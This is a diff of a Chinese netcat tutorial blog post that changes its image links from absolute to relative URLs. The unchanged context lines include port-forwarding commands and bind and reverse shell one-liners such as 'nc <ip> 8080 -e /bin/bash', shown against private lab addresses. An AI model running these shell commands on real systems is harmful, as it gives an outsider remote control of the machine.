@@ -2,7 +2,7 @@
 title: TCP/IP 瑞士军刀 - netcat (篇二)
 date: 2020-12-11 19:19:36
 tags: [TCP/IP, netcat]
-thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/banner.jpg
+thumbnail: TCP-IP-Swiss-Army-Knife-netcat-1/banner.jpg
 ---
 
 [欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】](https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2.html)
@@ -21,7 +21,7 @@ thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/ban
 - 远端执行 `nc -l -k -p 8080 -c "nc 192.168.1.21 22"`，即可将 `8080` 端口转发到 `192.168.1.21:22`
 - 本地执行 `ssh 10.144.137.114 -p 8080` 即可测试转发成功
 
-![GNU-netcat 端口转发](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-port-forwarding.gif)
+![GNU-netcat 端口转发](TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-port-forwarding.gif)
 
 ## 反弹 Shell
 `netcat` 在网络应用中，很受黑客的喜爱，`反弹 Shell` 是其经常使用的场景。
@@ -41,7 +41,7 @@ thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/ban
 - 目标机器：`nc -l -p 8080 -e /bin/bash`
 - 本地机器：`nc 10.144.137.114 8080`
 
-![GNU netcat 弹正向 Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-bind-shell.gif)
+![GNU netcat 弹正向 Shell](TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-bind-shell.gif)
 
 ### 反向 Shell
 先监听后连接，即 `本地机器` 先监听 `目标机器` 的某端口，如果 `目标机器` 在该端口弹出了 Shell，就可立即连接上。
@@ -49,7 +49,7 @@ thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/ban
 - 本地机器：`nc -v -l -p 8080`
 - 目标机器：`nc 10.144.247.172 8080 -e /bin/bash`
 
-![GNU netcat 弹反向 Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-reverse-shell-2.gif)
+![GNU netcat 弹反向 Shell](TCP-IP-Swiss-Army-Knife-netcat-2/netcat-gnu-reverse-shell-2.gif)
 
 
 ### OpenBSD netcat 实现正向 Shell
@@ -73,7 +73,7 @@ thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/ban
 > 
 > 至此形成一个完整的循环
 
-![OpenBSD netcat 弹正向 Shell](https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2/netcat-openbsd-bind-shell-with-fifo.gif)
+![OpenBSD netcat 弹正向 Shell](TCP-IP-Swiss-Army-Knife-netcat-2/netcat-openbsd-bind-shell-with-fifo.gif)
 
 ## 写在最后
 本文演示了用 `netcat` 实现 `端口转发` 和 `反弹 Shell`，还有很多案例，等待读者们去发掘！
@@ -81,4 +81,4 @@ thumbnail: https://image.blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1/ban
 ---
 
 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊
-![](https://image.blog.chaosjohn.com/donate-me.png)
+![](hello-world/donate-me.png)
